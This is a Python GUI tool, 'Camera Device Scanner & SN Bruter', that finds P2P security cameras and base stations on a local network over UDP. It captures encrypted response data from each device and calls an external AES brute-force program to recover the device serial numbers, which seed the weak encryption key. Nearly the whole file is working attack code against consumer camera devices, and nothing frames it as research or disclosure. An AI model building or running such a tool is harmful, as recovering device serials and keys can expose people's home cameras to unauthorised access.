import sys
import socket
import struct
import time
import base64
import subprocess
import re
import threading
import queue
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from Crypto.Cipher import AES
from typing import List, Dict, Optional, Tuple, Any, Callable


class CONSTANTS:
    DEFAULT_PORT = 32108  

    class REQUEST_MESSAGE_TYPE:
        LOCAL_LOOKUP = bytes([0xF1, 0x30])
        CHECK_CAM = bytes([0xF1, 0x41])
        DATA = bytes([0xF1, 0xD0])

    class RESPONSE_MESSAGE_TYPE:
        LOCAL_LOOKUP_RESP = bytes([0xF1, 0x41])
        DATA = bytes([0xF1, 0xD0])

    class P2P_DATA_TYPE_HEADER:
        DATA = bytes([0xD1, 0x00])


    class ENCRYPTION_TYPE:
        NONE = 0
        AES = 1

    MAX_SEQUENCE_NUMBER = 65535
    MAGIC_WORD = "XZYH"


class Utils:
    @staticmethod
    def mask_sn(sn: str, visible_chars: int = 4) -> str:
        """
        Masks the SN string, keeping visible_chars from start and end.
        Example: '123456789' -> '1234****9' (if visible_chars=4)
        """
        if not sn or len(sn) <= visible_chars * 2:
            return sn  # If too short, show as is or return empty
        
        start_part = sn[:visible_chars]
        end_part = sn[-visible_chars:]
        mask_length = len(sn) - (visible_chars * 2)
        masked_part = '*' * mask_length
        
        return f"{start_part}{masked_part}{end_part}"

    @staticmethod
    def is_p2p_command_encrypted(cmd: int) -> bool:
        return True

    @staticmethod
    def send_message(sock: socket.socket, address: Tuple[str, int], msg_id: bytes,
                    payload: Optional[bytes] = None) -> int:
        if payload is None:
            payload = bytes()

        if msg_id == CONSTANTS.REQUEST_MESSAGE_TYPE.LOCAL_LOOKUP:
            message = msg_id + payload
        else:
            payload_len = struct.pack('!H', len(payload))
            message = msg_id + payload_len + payload

        try:
            bytes_sent = sock.sendto(message, address)
            return bytes_sent
        except Exception as e:
            raise

    @staticmethod
    def has_header(msg: bytes, searched_type: bytes) -> bool:
        if len(msg) < 2:
            return False
        return msg[:2] == searched_type

    @staticmethod
    def build_command_header(seq_number: int, command_type: int) -> bytes:
        data_type_buffer = CONSTANTS.P2P_DATA_TYPE_HEADER.DATA
        seq_buffer = struct.pack('!H', seq_number)
        magic_string = CONSTANTS.MAGIC_WORD.encode('utf-8')
        command_type_buffer = struct.pack('<H', command_type)
        return data_type_buffer + seq_buffer + magic_string + command_type_buffer

    @staticmethod
    def build_int_string_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                        command_type: int, value: int, value_sub: int = 0,
                                        str_value: str = "", str_value_sub: str = "",
                                        channel: int = 0) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        someint_buffer = struct.pack('<I', value_sub)
        value_buffer = struct.pack('<I', value)

        str_value_buffer = Utils.string_with_length(str_value) if str_value else bytes()
        str_value_sub_buffer = Utils.string_with_length(str_value_sub) if str_value_sub else bytes()

        tmp_data_buffer = someint_buffer + value_buffer + str_value_buffer + str_value_sub_buffer

        if encrypted:
            data_buffer = Utils.padding_p2p_data(tmp_data_buffer)
        else:
            data_buffer = tmp_data_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_string_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                    command_type: int, str_payload: str, channel: int = 255) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        payload_buffer = str_payload.encode('utf-8')

        if encrypted:
            data_buffer = Utils.padding_p2p_data(payload_buffer)
        else:
            data_buffer = payload_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_int_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                 command_type: int, value: int, str_value: str = "",
                                 channel: int = 255) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        value_buffer = struct.pack('<I', value)

        str_value_buffer = Utils.string_with_length(str_value) if str_value else bytes()

        tmp_data_buffer = value_buffer + str_value_buffer

        if encrypted:
            data_buffer = Utils.padding_p2p_data(tmp_data_buffer)
        else:
            data_buffer = tmp_data_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_void_command_payload(channel: int = 255) -> bytes:
        header_buffer = bytes([0x00, 0x00])
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])
        channel_buffer = bytes([channel, 0x00])
        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer

    @staticmethod
    def padding_p2p_data(data: bytes, blocksize: int = 16) -> bytes:
        if len(data) < blocksize:
            buffer_size = blocksize
        else:
            buffer_size = (len(data) + blocksize - 1) // blocksize * blocksize

        result = bytearray(buffer_size)
        result[:len(data)] = data
        return bytes(result)

    @staticmethod
    def encrypt_p2p_data(data: bytes, key: bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_ECB)
        return cipher.encrypt(data)

    @staticmethod
    def string_with_length(input_str: str, chunk_length: int = 128) -> bytes:
        string_buffer = input_str.encode('utf-8')
        if len(string_buffer) < chunk_length:
            buffer_size = chunk_length
        else:
            buffer_size = (len(string_buffer) + chunk_length - 1) // chunk_length * chunk_length

        result = bytearray(buffer_size)
        result[:len(string_buffer)] = string_buffer
        return bytes(result)

    @staticmethod
    def p2p_did_to_buffer(p2p_did: str) -> bytes:
        p2p_array = p2p_did.split("-")
        buf1 = Utils.string_with_length(p2p_array[0], 8)
        buf2 = struct.pack('!I', int(p2p_array[1]))
        buf3 = Utils.string_with_length(p2p_array[2], 8)
        return buf1 + buf2 + buf3

    @staticmethod
    def build_check_cam_payload(p2p_did: str) -> bytes:
        p2p_did_buffer = Utils.p2p_did_to_buffer(p2p_did)
        magic = bytes([0x00, 0x00, 0x00])
        return p2p_did_buffer + magic

    @staticmethod
    def build_local_lookup_payload() -> bytes:
        return bytes([0x00, 0x00])


class OfflineP2PSync:
    def __init__(self, station_sn: str, broadcast_address: str = "",
                 encryption_type: int = 0, log_callback: Optional[Callable[[str], None]] = None):
        self.p2p_did = None
        self.station_sn = station_sn
        self.broadcast_address = broadcast_address
        self.encryption_type = encryption_type
        self.encryption_key = self._generate_encryption_key()
        self.log_callback = log_callback or print

        self.socket = None
        self.local_port = None
        self.connected = False
        self.connect_address = None
        self.seq_number = 0

        self.log(f'Initializing application...')
    
    def log(self, message: str):
        if self.log_callback:
            self.log_callback(message)

    def _generate_encryption_key(self) -> Optional[bytes]:
        if not self.station_sn:
            return None
        sn_last7 = self.station_sn[-7:].rjust(7, '0')
        return sn_last7.encode('utf-8')

    def bind(self):
        if self.socket is not None:
            return
    
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        try:
            self.socket.sendto(b'', ('127.0.0.1', 1))
        except:
            pass

        self.local_port = self.socket.getsockname()[1]

    def discover(self, timeout: int = 3) -> List[Dict[str, Any]]:
        self.bind()

        devices = []
        payload = Utils.build_local_lookup_payload()

        broadcast_addresses = [self.broadcast_address] if self.broadcast_address else ['192.168.0.255']

        self.log(f'Scanning for devices...')

        for broadcast_address in broadcast_addresses:
            try:
                Utils.send_message(
                    self.socket,
                    (broadcast_address, CONSTANTS.DEFAULT_PORT),
                    CONSTANTS.REQUEST_MESSAGE_TYPE.LOCAL_LOOKUP,
                    payload
                )
            except Exception as e:
                self.log(f'Failed to send broadcast packet: {e}')

        self.socket.settimeout(timeout / 1000)
        start_time = time.time()

        while time.time() - start_time < timeout / 1000:
            try:
                data, addr = self.socket.recvfrom(4096)
                if Utils.has_header(data, CONSTANTS.RESPONSE_MESSAGE_TYPE.LOCAL_LOOKUP_RESP):
                    if len(data) >= 24:
                        part1 = data[4:12].decode('utf-8').rstrip('\x00')
                        part2 = struct.unpack('!I', data[12:16])[0]
                        part3 = data[16:24].decode('utf-8').rstrip('\x00')
                        p2p_did = f'{part1}-{str(part2).zfill(6)}-{part3}'

                        device = {
                            'host': addr[0],
                            'ip': addr[0],
                            'port': addr[1],
                            'p2pDid': p2p_did
                        }

                        if device not in devices:
                            devices.append(device)

            except socket.timeout:
                continue
            except Exception as e:
                if '10054' in str(e):
                    continue
                else:
                    self.log(f'Error receiving data: {e}')
                    break

        self.log(f'[+] Discovery complete. Found {len(devices)} device(s).')
        return devices
    
    def connect(self, device: Dict[str, Any], max_retries: int = 3):
        if self.connected:
            self.log('[*] Already connected. Skipping reconnection.')
            return

        if self.socket is None:
            raise Exception('Socket not initialized. Please run discovery first.')
        
        self.p2p_did = device['p2pDid']
        self.connect_address = (device['host'], device['port'])
        self._generate_full_encryption_key()

        payload = Utils.build_check_cam_payload(self.p2p_did)
        
        for attempt in range(max_retries):
            try:
                Utils.send_message(
                    self.socket,
                    self.connect_address,
                    CONSTANTS.REQUEST_MESSAGE_TYPE.CHECK_CAM,
                    payload
                )
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    self.log(f'[-] Failed to send CHECK_CAM request to {device["host"]}:{device["port"]}: {e}')
                    raise
                self.log(f'[*] Retrying ({attempt + 1}/{max_retries}) for {device["host"]}:{device["port"]}')
                time.sleep(0.1)
        
        self._clear_receive_buffer()

        self.connected = True

    def _generate_full_encryption_key(self):
        if not self.station_sn or not self.p2p_did:
            return

        sn_last7 = self.station_sn[-7:].rjust(7, '0')
        dash_index = self.p2p_did.find('-')

        if dash_index >= 0:
            p2p_did_part = self.p2p_did[dash_index:].ljust(9, '0')[:9]
        else:
            p2p_did_part = self.p2p_did.ljust(9, '0')[:9]

        key_string = (sn_last7 + p2p_did_part)[:16]
        self.encryption_key = key_string.encode('utf-8')

    def _clear_receive_buffer(self):
        if not self.socket:
            return

        original_timeout = self.socket.gettimeout()
        self.socket.settimeout(0.01)
        try:
            while True:
                data, addr = self.socket.recvfrom(4096)
        except socket.timeout:
            pass
        except Exception as e:
            pass
        finally:
            self.socket.settimeout(original_timeout)

    def send_command_without_data(self, command_type: int, channel: int = 255):
        if not self.connected or not self.connect_address:
            raise Exception('Not connected to any device.')

        command_header = Utils.build_command_header(self.seq_number, command_type)
        payload = Utils.build_void_command_payload(channel)

        data = command_header + payload

        Utils.send_message(
            self.socket,
            self.connect_address,
            CONSTANTS.REQUEST_MESSAGE_TYPE.DATA,
            data
        )

        self.seq_number = (self.seq_number + 1) % (CONSTANTS.MAX_SEQUENCE_NUMBER + 1)

    def receive_data(self, timeout: int = 3000) -> Optional[Tuple[bytes, Tuple[str, int]]]:
        if not self.connected or not self.socket:
            raise Exception('Not connected to device')

        self.socket.settimeout(timeout / 1000)
        
        try:
            while True:
                data, addr = self.socket.recvfrom(4096)
                if addr == self.connect_address:
                    return data, addr
        except socket.timeout:
            return None
        except Exception as e:
            self.log(f'Receive error: {e}')
            return None

    def close(self):
        self.connected = False
        self.connect_address = None
        self.p2p_did = None
        self.seq_number = 0
        self._clear_receive_buffer()

    def shutdown(self):
        if self.socket:
            self.socket.close()
            self.socket = None


def check_connection_port(host: str, port: int, timeout: int = 500) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout / 1000)
        try:
            sock.connect((host, port))
            return True
        except (socket.timeout, ConnectionRefusedError):
            return False

def brute_force_sn(ping_data: bytes, key_suffix: str, exe_path: str = 'aes_bruteforce.exe') -> Optional[str]:
    try:
        process = subprocess.Popen(
            [exe_path, key_suffix, ping_data],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        full_output = []
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if line:
                full_output.append(line)
        
        process.wait()
        output_text = ''.join(full_output)
        
        match = re.search(r'SN\[(.*?)\]', output_text)
        if match:
            return match.group(1)
        
        return None
        
    except subprocess.TimeoutExpired:
        return None
    except FileNotFoundError:
        return None
    except Exception as e:
        return None


def run_scan_process(config: Dict[str, Any], log_callback: Callable[[str], None], result_callback: Callable[[Dict], None]):
    """
    Runs the scanning logic in a separate thread.
    """
    p2p = None
    try:
        p2p = OfflineP2PSync(
            station_sn=config['stationSn'],
            broadcast_address=config['broadcastAddress'],
            encryption_type=config['encryptionType'],
            log_callback=log_callback
        )
        
        log_callback('[*] Starting device discovery...')
        devices = p2p.discover(timeout=2000)
        
        if devices:
            log_callback('[*] Retrieving decryption data. Please wait...')
            for device in devices:
                try:
                    p2p.connect(device)
                    p2p.send_command_without_data(command_type=1139)
                    while True:
                        result = p2p.receive_data()
                        if result is not None:
                            received_data, addr = result
                            datalen = len(received_data)
                            if datalen == 40:
                                if(received_data[12] == 0x73 and received_data[13] == 0x04):
                                    ping_data_base64 = base64.b64encode(received_data[24:]).decode('utf-8')
                                    device['ping'] = ping_data_base64
                                    break
                    p2p.close()
                except Exception as e:
                    log_callback(f'[-] Failed to get ping data from {device["host"]}:{device["port"]}: {e}')
                    p2p.close()
            
            log_callback('[+] Decryption data retrieved successfully.')
            log_callback('[*] Initiating brute-force attack. Please wait...')
            
            for device in devices:
                log_callback(f'[*] Brute-forcing SN for {device["host"]}:{device["port"]}...')
                if 'ping' not in device:
                    log_callback(f'[-] No ping data available for {device["host"]}')
                    continue
                
                dash_index = device['p2pDid'].find('-')
                if dash_index >= 0:
                    p2p_did_part = device['p2pDid'][dash_index:].ljust(9, '0')[:9]
                else:
                    p2p_did_part = device['p2pDid'].ljust(9, '0')[:9]
                
                sn_suffix = brute_force_sn(key_suffix=p2p_did_part, ping_data=device['ping'], exe_path=config['bruteForcePath'])
                if sn_suffix:
                    full_sn = config['stationSn'] + sn_suffix
                    device['sn_plain'] = full_sn
                    device['sn'] = Utils.mask_sn(full_sn, visible_chars=2)
                else:
                    device['sn_plain'] = "Unknown"
                    device['sn'] = "Unknown"
                
                # Send result to GUI
                result_callback(device)
            
            log_callback('[+] Brute-force process completed.')
            log_callback("=" * 60)
            log_callback(f"{'Type':<12} {'IP:Port':<20} {'SN'}")
            log_callback("-" * 60)
            for device in devices:
                if check_connection_port(device['host'], 554) and check_connection_port(device['host'], 9000):
                    log_callback(f"{'HomeBase':<12} {device['host']}:{str(device['port']):<4}  {device['sn']}")
                else:
                    log_callback(f"{'Device':<12} {device['host']}:{str(device['port']):<4}  {device['sn']}")
            log_callback("=" * 60)
            
    except Exception as error:
        log_callback(f'\nOperation failed: {error}')
        import traceback
        log_callback(traceback.format_exc())
    finally:
        if p2p:
            p2p.shutdown()


class P2PScannerGUI:
    def __init__(self, root):
        self.results_cache = {}  
        self.root = root
        self.root.title("Camera Device Scanner & SN Bruter")
        self.root.geometry("800x600")
        
        # Configuration variables
        self.station_sn = tk.StringVar(value="XXXXXXXXX")
        self.broadcast_address = tk.StringVar(value="192.168.0.255")
        self.brute_force_path = tk.StringVar(value="aes_bruteforce.exe")
        
        # Queue for thread communication
        self.log_queue = queue.Queue()
        self.result_queue = queue.Queue()
        
        # Thread control
        self.scan_thread = None
        self.is_scanning = False
        
        self.setup_ui()
        self.check_queue()
        
    def setup_ui(self):
        # Main Container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configuration Frame
        config_frame = ttk.LabelFrame(main_frame, text="Configuration", padding="10")
        config_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(config_frame, text="Station SN:").grid(row=0, column=0, sticky=tk.W, pady=5)
        ttk.Entry(config_frame, textvariable=self.station_sn, width=30).grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(config_frame, text="Broadcast Address:").grid(row=1, column=0, sticky=tk.W, pady=5)
        ttk.Entry(config_frame, textvariable=self.broadcast_address, width=30).grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(config_frame, text="Brute Force Executable:").grid(row=2, column=0, sticky=tk.W, pady=5)
        ttk.Entry(config_frame, textvariable=self.brute_force_path, width=30).grid(row=2, column=1, sticky=(tk.W, tk.E), pady=5)
        ttk.Button(config_frame, text="Browse...", command=self.browse_exe).grid(row=2, column=2, padx=(5, 0))
        
        # Control Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=1, column=0, columnspan=2, pady=(0, 10))
        
        self.start_btn = ttk.Button(button_frame, text="Start Scan", command=self.start_scan)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(button_frame, text="Stop", command=self.stop_scan, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Log Output
        log_frame = ttk.LabelFrame(main_frame, text="Log Output", padding="5")
        log_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        self.log_text = tk.Text(log_frame, height=10, width=80, state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Results Table
        result_frame = ttk.LabelFrame(main_frame, text="Results", padding="5")
        result_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        columns = ("Type", "IP:Port", "SN")
        self.tree = ttk.Treeview(result_frame, columns=columns, show="headings", height=10)
        
        self.tree.heading("Type", text="Type")
        self.tree.heading("IP:Port", text="IP:Port")
        self.tree.heading("SN", text="SN")
        
        self.tree.column("Type", width=100)
        self.tree.column("IP:Port", width=200)
        self.tree.column("SN", width=300)
        
        scrollbar = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        action_frame = ttk.Frame(main_frame)
        action_frame.grid(row=4, column=0, columnspan=2, pady=(10, 0), sticky=(tk.W, tk.E))
        
        self.copy_sn_btn = ttk.Button(action_frame, text="Copy Selected SN", command=self.copy_selected_sn)
        self.copy_sn_btn.pack(side=tk.LEFT, padx=5)
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(2, weight=1)
        main_frame.rowconfigure(3, weight=1)
        main_frame.rowconfigure(4, weight=0)
        
    def browse_exe(self):
        filename = filedialog.askopenfilename(
            title="Select Brute Force Executable",
            filetypes=[("Executable files", "*.exe"), ("All files", "*.*")]
        )
        if filename:
            self.brute_force_path.set(filename)
            
    def log_message(self, message: str):
        """Thread-safe logging to GUI"""
        self.log_queue.put(message)
        
    def add_result(self, device: Dict):
        """Thread-safe result adding to GUI"""
        self.result_queue.put(device)
        
    def check_queue(self):
        """Poll queues and update UI"""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_text.configure(state=tk.NORMAL)
                self.log_text.insert(tk.END, message + "\n")
                self.log_text.see(tk.END)
                self.log_text.configure(state=tk.DISABLED)
        except queue.Empty:
            pass
            
        try:
            while True:
                device = self.result_queue.get_nowait()
                device_type = "HomeBase" if check_connection_port(device['host'], 554) and check_connection_port(device['host'], 9000) else "Device"
                ip_port = f"{device['host']}:{device['port']}"
                sn = device.get('sn', 'Unknown')
                
                item_id = self.tree.insert("", tk.END, values=(device_type, ip_port, sn))
                self.results_cache[item_id] = device
                
        except queue.Empty:
            pass
            
        # Schedule next check
        self.root.after(100, self.check_queue)
        
    def copy_selected_sn(self):
        selected_item = self.tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a device first.")
            return
        
        item_id = selected_item[0]
        
        if item_id in self.results_cache:
            device_data = self.results_cache[item_id]
            plain_sn = device_data.get('sn_plain', 'Unknown')
            
            self.root.clipboard_clear()
            self.root.clipboard_append(plain_sn)
            self.root.update()
            
            original_text = self.copy_sn_btn.cget("text")
            self.copy_sn_btn.configure(text="Copied!")
            self.root.after(1000, lambda: self.copy_sn_btn.configure(text=original_text))
        else:
            messagebox.showerror("Error", "Data not found for selected item.")

    def start_scan(self):
        if self.is_scanning:
            return

        self.results_cache.clear()         
        self.is_scanning = True
        self.start_btn.configure(state=tk.DISABLED)
        self.stop_btn.configure(state=tk.NORMAL)
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state=tk.DISABLED)
        
        # Clear previous results
        for item in self.tree.get_children():
            self.tree.delete(item)
            
        config = {
            'stationSn': self.station_sn.get(),
            'broadcastAddress': self.broadcast_address.get(),
            'encryptionType': CONSTANTS.ENCRYPTION_TYPE.AES,
            'bruteForcePath': self.brute_force_path.get()
        }
        
        self.scan_thread = threading.Thread(
            target=run_scan_process,
            args=(config, self.log_message, self.add_result),
            daemon=True
        )
        self.scan_thread.start()
        
    def stop_scan(self):
        self.is_scanning = False
        self.start_btn.configure(state=tk.NORMAL)
        self.stop_btn.configure(state=tk.DISABLED)
        self.log_message("[*] Scan stopped by user.")


if __name__ == '__main__':
    # Note: Requires 'pycryptodome' package installed (pip install pycryptodome)
    root = tk.Tk()
    app = P2PScannerGUI(root)
    root.mainloop()
